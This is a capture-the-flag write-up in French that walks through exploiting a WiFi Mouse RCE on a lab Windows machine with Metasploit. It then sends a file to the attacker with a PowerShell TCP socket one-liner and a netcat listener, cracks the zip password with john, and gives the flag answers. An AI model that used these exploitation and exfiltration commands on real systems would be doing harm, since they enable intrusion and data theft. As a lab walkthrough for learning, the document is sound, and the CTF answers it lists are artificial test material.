# Shadow Track - Writeup Complet

## 1. Introduction

**Cible** : `172.20.15.82`
**Objectif** : Compromettre la machine cible, exfiltrer un malware suspect et l'analyser.

## 2. Reconnaissance

### Scan de Ports

La première étape consiste à identifier les services actifs sur la machine cible.

```bash
nmap -p- -T4 -sV 172.20.15.82
```

**Résultats du scan :**

- Ports Windows classiques : 135 (RPC), 139 (NetBIOS), 445 (SMB).
- **Port critique : 1978/tcp - `unis-mouse-server`**

Ce service correspond à l'application **WiFi Mouse**, qui permet de contrôler une souris à distance via smartphone. Une recherche rapide révèle que les versions antérieures à 1.7.8.5 sont vulnérables à une exécution de code à distance (RCE) sans authentification.

## 3. Exploitation (RCE)

Nous utilisons le module Metasploit dédié pour exploiter cette vulnérabilité.

**Configuration de l'exploit dans msfconsole :**

```bash
use exploit/windows/misc/wifi_mouse_rce
set RHOSTS 172.20.15.82
set LHOST 10.8.96.29   # Notre IP VPN
set SRVPORT 8080       # Port pour le serveur web de payload
exploit
```

**Résultat :**
L'exploit réussit et nous obtenons un shell distant (`cmd.exe`) en tant qu'utilisateur **Harry**.

```text
[*] Command shell session 1 opened (10.8.96.29:4444 -> 172.20.15.82:51379)
C:\Windows\system32> whoami
desktop-bg4o059\harry
```

## 4. Post-Exploitation : La Chasse au Malware

En explorant le système de fichiers, nous localisons un fichier suspect dans le dossier de téléchargements de l'utilisateur :

**Chemin** : `C:\Users\Harry\Downloads\malware.zip`

### Défi d'Exfiltration

Nous devons récupérer ce fichier pour l'analyser. Plusieurs obstacles se sont présentés :

1. **Transfert Meterpreter** : La commande `download` échouait ou corrompait le fichier.
2. **Décompression locale** : Les outils comme `Expand-Archive` sur la cible ne parvenaient pas à ouvrir l'archive, suggérant une corruption ou un format spécifique.
3. **Encodage Base64** : L'encodage avec `certutil` a fonctionné mais le copier-coller du gros volume de texte a introduit des erreurs de formatage.

### Solution Technique : Exfiltration par Socket TCP (PowerShell)

Pour contourner ces problèmes et garantir l'intégrité du fichier binaire, nous avons utilisé une méthode "Living off the Land" en créant un socket TCP direct via PowerShell.

**1. Côté Attaquant (Nous) :**
Nous ouvrons un écouteur Netcat sur le port 4445 pour recevoir les données brutes et les écrire dans un fichier.

```bash
nc -lvnp 4445 > malware_final.zip
```

**2. Côté Victime (Harry) :**
Nous exécutons cette commande PowerShell via notre shell pour lire les octets du fichier et les envoyer directement sur notre port.

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TcpClient('10.8.96.29', 4445); $stream = $client.GetStream(); $bytes = [System.IO.File]::ReadAllBytes('C:\Users\Harry\Downloads\malware.zip'); $stream.Write($bytes, 0, $bytes.Length); $client.Close()"
```

**Résultat :** Transfert réussi et intègre du fichier `malware_final.zip`.

## 5. Analyse du Malware

### Craquage du Mot de Passe

En tentant de décompresser `malware_final.zip`, nous découvrons qu'il est protégé par un mot de passe.

**Extraction du Hash :**
Nous utilisons `zip2john` pour convertir l'archive en un format crackable.

```bash
zip2john malware_final.zip > malware_hash.txt
```

**Attaque par Dictionnaire :**
Nous utilisons `john` avec la wordlist `rockyou_10k.txt`.

```bash
john --wordlist=rockyou_10k.txt malware_hash.txt
```

**Mot de passe trouvé :** `money`

### Empreinte Numérique (Hash)

Une fois l'archive déverrouillée avec le mot de passe `money`, nous extrayons le fichier `malware.exe`.

Pour identifier le malware de manière unique (répondre à la question du CTF), nous calculons son hash MD5 :

```bash
md5sum malware.exe
```

**Hash MD5 Final :** `035bce7b8ecd5e46298e2666c5ba2fb2`

---
**Résumé des drapeaux / réponses clés :**

- **Vecteur d'attaque** : MouseServer (Port 1978)
- **Fichier exfiltré** : malware.zip
- **Mot de passe de l'archive** : money
- **Hash MD5 du malware** : 035bce7b8ecd5e46298e2666c5ba2fb2
